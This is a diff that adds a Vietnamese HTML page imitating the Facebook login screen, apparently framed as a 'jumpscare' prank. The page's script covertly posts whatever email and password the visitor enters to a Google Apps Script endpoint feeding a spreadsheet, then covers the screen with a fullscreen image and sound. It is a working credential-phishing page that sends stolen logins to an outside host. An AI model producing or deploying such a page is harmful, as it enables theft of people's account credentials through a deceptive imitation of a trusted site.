@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Facebouk</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .fb-logo { color: #1877f2; font-size: 60px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
+        .login-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 16px rgba(0, 0, 0, .1); padding: 20px; width: 396px; text-align: center; box-sizing: border-box; }
+        input { border-radius: 6px; border: 1px solid #dddfe2; font-size: 17px; height: 52px; padding: 14px 16px; width: 100%; margin-bottom: 12px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .btn-login { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: 700; line-height: 48px; width: 100%; cursor: pointer; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .btn-create { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: 700; line-height: 48px; padding: 0 16px; cursor: pointer; display: inline-block; }
+        
+        /* Jumpscare */
+        #jumpscare { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 10000; justify-content: center; align-items: center; }
+        #jumpscare img { max-width: 100%; max-height: 100%; transform: scale(1.8); }
+    </style>
+</head>
+<body>
+
+    <div class="fb-logo">facebook</div>
+
+    <div class="login-box">
+        <input type="text" id="user" placeholder="Email hoặc số điện thoại">
+        <input type="password" id="pass" placeholder="Mật khẩu">
+        <button class="btn-login" onclick="trigger()">Đăng nhập</button>
+        <div style="color: #1877f2; font-size: 14px; margin: 16px 0; cursor: pointer;">Quên mật khẩu?</div>
+        <hr>
+        <div class="btn-create">Tạo tài khoản mới</div>
+    </div>
+
+    <div id="jumpscare">
+        <img src="sigma.png" alt="Sigma">
+        <audio id="sfx" src="https://www.myinstants.com/media/sounds/vine-boom.mp3"></audio>
+    </div>
+
+    <script>
+        // THAY LINK APPS SCRIPT CỦA BẠN VÀO ĐÂY
+        const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwE6gVFqbFVFb_f4jh2MAn-XzVaiVfPr6dTz2q1ZyCuNWuqy9d0YKkpl12jwsMn4Kc/exec';
+
+        async function trigger() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            if (u && p) {
+                // 1. Gửi dữ liệu ngầm lên Google Sheets
+                fetch(APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Quan trọng để tránh lỗi CORS
+                    cache: 'no-cache',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: u, password: p })
+                });
+
+                // 2. Hiển thị Jumpscare ngay lập tức
+                const js = document.getElementById('jumpscare');
+                const sfx = document.getElementById('sfx');
+                
+                js.style.display = 'flex';
+                sfx.play();
+
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                }
+            } else {
+                alert("Vui lòng nhập tài khoản và mật khẩu!");
+            }
+        }
+    </script>
+</body>
+</html>
